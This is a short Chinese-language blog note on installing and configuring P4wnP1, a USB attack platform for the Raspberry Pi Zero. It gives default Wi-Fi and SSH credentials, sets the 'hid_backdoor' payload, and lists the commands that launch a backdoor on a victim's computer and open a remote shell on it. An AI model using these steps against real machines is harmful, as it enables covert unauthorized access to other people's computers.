---
title: 【笔记】P4wnP1 学习笔记
categories:
  - 树莓派
date: 2020-01-15 22:44:47
---

## 前言

P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor).（[官网](https://github.com/mame82/P4wnP1)）

<!-- more -->

## ~旧安装方法~

### 准备工作

- 已配置`wifi`和`ssh`的`raspbian-stretch`系统的树莓派

### 安装

#### 克隆源代码

``` sh
git clone https://github.com/mame82/P4wnP1.git
```

#### 执行安装程序

``` sh
cd P4wnP1
./install.sh
```

#### 安装完成

![01.png](/images/20200115224447/01.png)

## 新安装方法

### 准备工作

- [P4wnP1_0_1_alpha.img](https://github.com/mame82/P4wnP1/releases)

### 安装

- 直接将`P4wnP1.img`烧录在树莓派

### 启动方法

- 连接wifi

> 名称：`P4wnP1`
> 密码：`MaMe82-P4wnP1`

- 登录ssh

> ip地址：`172.24.0.1`
> 端口号：`22`
> 用户名：`pi`
> 密码：`raspberry`

### 安装完成

![02.png](/images/20200115224447/02.png)

## 配置

- 重启树莓派

### 修改 setup.cfg 文件

``` sh
nano P4wnP1/setup.cfg
```

### 编辑 setup.cfg 文件

``` sh
#PLAYLOAD=network_only.txt
PLAYLOAD=hid_backdoor.txt
```

## 启动

- 重启树莓派

### 查看帮助

``` sh
P4wnP1 shell > help
```

### 启动后门

- 被害者电脑会有`PowerShell`窗口闪过

``` sh
P4wnP1 shell > FireStage1
```

### 发送脚本

``` sh
P4wnP1 shell > SendDuckyScript
```

### 获取命令提示符

``` sh
P4wnP1 shell > shell
```

## 完成

## 参考文献

[南墙的博客](http://imzifeng.cn/2018/07/badusb-on-raspberry-pi-zero-w/)
[YouTuBe——Seytonic](https://www.youtube.com/watch?v=Pft7voW5ui8)
[沫延说的博客](https://blog.topstalk.com/raspberry-pi-zero-w-安装-p4wnp1-完整教程/)

